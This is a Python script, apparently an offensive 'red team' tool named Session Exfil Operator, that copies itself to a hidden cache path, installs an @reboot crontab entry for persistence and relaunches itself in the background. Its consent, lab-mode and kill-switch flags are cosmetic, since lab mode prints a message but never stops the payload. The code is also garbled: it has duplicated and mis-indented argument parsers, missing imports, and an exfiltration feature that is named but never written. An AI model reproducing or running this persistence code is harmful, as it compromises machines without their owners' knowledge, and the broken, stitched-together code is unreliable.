
from datetime import datetime

LOG_PATH = os.path.expanduser("~/exfil/.logs/exfil.log")

def log_event(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a") as log:
        log.write(f"[{timestamp}] {event}\n")

"""
__toolname__ = "Session Exfil Operator"
__author__ = "BlackOpsArchitect"
__intended_use__ = "Red team simulation / adversarial lab training only"
__lab_safe__ = True
__version__ = "1.0.10"
__kill_switch__ = "ENV:KILL=1"
__consent_required__ = True
__notes__ = "Stealth-grade tool with modular execution, full encryption, and lab-mode gating"
"""



import argparse
parser = argparse.ArgumentParser()
    parser.add_argument("--field", action="store_true", help="Field mode (exfil+persistence)")
parser.add_argument("--lab", action="store_true")


parser.add_argument("--consent", action="store_true")

parser.add_argument("--kill", action="store_true")
parser.add_argument("--lab", action="store_true", help="Lab mode (safe testing)")
parser.add_argument("--consent", action="store_true", help="Acknowledge and proceed")
parser.add_argument("--kill", action="store_true", help="Trigger kill switch")
args = parser.parse_args()
import argparse

parser = argparse.ArgumentParser(description="Session Exfil Operator Suite")
parser.add_argument("--lab", action="store_true", help="Run in lab-safe mode (no persistence, no outbound exfil)")
parser.add_argument("--consent", action="store_true", help="Acknowledge ethical usage terms")
parser.add_argument("--kill", action="store_true", help="Trigger immediate kill-switch")

args = parser.parse_args()

if not args.consent:
    print("[!] Consent flag required to proceed with execution.")
    exit(0)

if args.kill or os.getenv("KILL") == "1":
    print("[x] Kill switch triggered. Exiting.")
    exit(0)

if args.lab:
    print("[*] Lab mode activated. Exfiltration and persistence modules disabled.")
    # Stub any real payload execution here (example)
    def noop(): pass

import os
import sys
import base64

def inject_cronjob():
    cron_entry = "@reboot python3 {} &\n".format(os.path.realpath(__file__))
    os.system(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -')

def hide_payload():
    hidden_path = os.path.expanduser("~/.local/.cache/.sess_payload.py")
    if not os.path.exists(hidden_path):
        shutil.copy2(sys.argv[0], hidden_path)
    return hidden_path

def run():
    hidden = hide_payload()
    inject_cronjob()
    os.system(f"python3 {hidden} &")

if __name__ == "__main__":
    run()
